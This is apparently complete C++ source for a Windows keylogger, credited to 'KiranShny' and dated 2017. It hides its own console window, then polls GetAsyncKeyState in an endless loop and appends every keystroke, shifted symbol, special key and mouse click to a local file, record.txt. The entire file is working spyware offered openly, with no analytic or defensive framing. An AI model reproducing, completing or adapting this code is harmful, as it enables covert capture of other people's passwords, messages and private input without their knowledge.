//============================================================================
// Name        : keylogger.cpp
// Author      : KiranShny
// Version     : Initial
// Copyright   : copyrights@2017 KiranShny
// Description : Keylogger using c++ [IDE USED: ECLIPSE]
// Requirements: windows.h,winuser.h [OS : WINDOWS]
//============================================================================
#include<iostream>
#include<fstream>
#include<winuser.h>
#include<windows.h>
#include<wincon.h>
using namespace std;
void hide() {
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}
void log() {
	char key;
	for (;;) {
		for (key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("record.txt", ios::app);
				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
					key += 32;
					write << key;
					write.close();
					break;
				} else if ((key > 64) && (key < 91)) {
					write << key;
					write.close();
					break;
				} else {
					switch (key) {
					case 48:
						if (GetAsyncKeyState(0x10))
							write << ")";
						else
							write << "0";
						break;
					case 49:
						if (GetAsyncKeyState(0x10))
							write << "!";
						else
							write << "1";
						break;
					case 50:
						if (GetAsyncKeyState(0x10))
							write << "@";
						else
							write << "2";
						break;
					case 51:
						if (GetAsyncKeyState(0x10))
							write << "#";
						else
							write << "3";
						break;
					case 52:
						if (GetAsyncKeyState(0x10))
							write << "$";
						else
							write << "4";
						break;
					case 53:
						if (GetAsyncKeyState(0x10))
							write << "%";
						else
							write << "5";
						break;
					case 54:
						if (GetAsyncKeyState(0x10))
							write << "^";
						else
							write << "6";
						break;
					case 55:
						if (GetAsyncKeyState(0x10))
							write << "&";
						else
							write << "7";
						break;
					case 56:
						if (GetAsyncKeyState(0x10))
							write << "*";
						else
							write << "8";
						break;
					case 57:
						if (GetAsyncKeyState(0x10))
							write << "(";
						else
							write << "9";
						break;
					case VK_SPACE:
						write<<" ";
					    break;
					case VK_RETURN:
						write<<"<ENTER>\n";
						break;
					case VK_TAB:
						write<<"<TAB>\t";
						break;
					case VK_BACK:
						write<<"<BACKSPACE>";
						break;
					case VK_ESCAPE:
						write<<"<ESC>";
						break;
					case VK_LBUTTON:
						write<<"<LeftClick>";
						break;
					case VK_RBUTTON:
						write<<"<RightClick>";
						break;
					case VK_MBUTTON:
						write<<"<MiddleButton>";
						break;
					case VK_SHIFT:
						write<<"<SHIFT>";
						break;
					case VK_CONTROL:
						write<<"<CTRL>";
						break;
					case VK_CAPITAL:
						write<<"<CAPSLOCK>";
						break;
					case VK_END:
						write<<"<END>";
						break;
					case VK_HOME:
						write<<"<HOME>";
						break;
					case VK_LEFT:
						write<<"<LEFT>";
						break;
					case VK_UP:
						write<<"<UP>";
						break;
					case VK_RIGHT:
						write<<"<RIGHT>";
						break;
					case VK_DOWN:
						write<<"<DOWN>";
						break;
					case VK_SNAPSHOT:
						write<<"<PRT.SCR>";
						break;
					case VK_INSERT:
						write<<"<INSERT>";
						break;
					case VK_DELETE:
						write<<"<DELETE>";
						break;
					case VK_LWIN:
						write<<"<LEFT.WIN.KEY>";
						break;
					case VK_RWIN:
						write<<"<RIGHT.WIN.KEY>";
						break;
					case VK_NUMPAD0:
						write<<"<NUM0>";
						break;
					case VK_NUMPAD1:
						write<<"<NUM1>";
						break;
					case VK_NUMPAD2:
						write<<"<NUM2>";
						break;
					case VK_NUMPAD3:
						write<<"<NUM3>";
						break;
					case VK_NUMPAD4:
						write<<"<NUM4>";
						break;
					case VK_NUMPAD5:
						write<<"<NUM5>";
						break;
					case VK_NUMPAD6:
						write<<"<NUM6>";
						break;
					case VK_NUMPAD7:
						write<<"<NUM7>";
						break;
					case VK_NUMPAD8:
						write<<"<NUM8>";
						break;
					case VK_NUMPAD9:
						write<<"<NUM9>";
						break;
					case VK_ADD:
						write<<"<+>";
						break;
					case VK_SUBTRACT:
						write<<"<->";
						break;
					case VK_MULTIPLY:
						write<<"<*>";
						break;
					case VK_DIVIDE:
						write<<"</>";
						break;		\
					case VK_F1:
						write<<"<F1>";
						break;
					case VK_F2:
						write<<"<F2>";
						break;
					case VK_F3:
						write<<"<F3>";
						break;
					case VK_F4:
						write<<"<F4>";
						break;
					case VK_F5:
						write<<"<F5>";
						break;
					case VK_F6:
						write<<"<F6>";
						break;
					case VK_F7:
						write<<"<F7>";
						break;
					case VK_F8:
						write<<"<F8>";
						break;
					case VK_F9:
						write<<"<F9>";
						break;
					case VK_F10:
						write<<"<F10>";
						break;
					case VK_F11:
						write<<"<F11>";
						break;
					case VK_F12:
						write<<"<F12>";
						break;
					case VK_NUMLOCK:
						write<<"<NUMLOCK>";
						break;
					case VK_SCROLL:
						write<<"<SCROLLOCK>";
						break;
					case VK_BROWSER_BACK:
						write<<"<BROWSER-BACK>";
						break;
					case VK_BROWSER_REFRESH:
						write<<"<BROWSER-REFRESH>";
						break;
					case VK_BROWSER_STOP:
						write<<"<BROWSER-STOP>";
						break;
					case VK_BROWSER_SEARCH:
						write<<"<BROWSER-SEARCH>";
						break;
					}
				}
			}
		}
	}
}
int main() {
	hide();
	log();
	return 0;
}

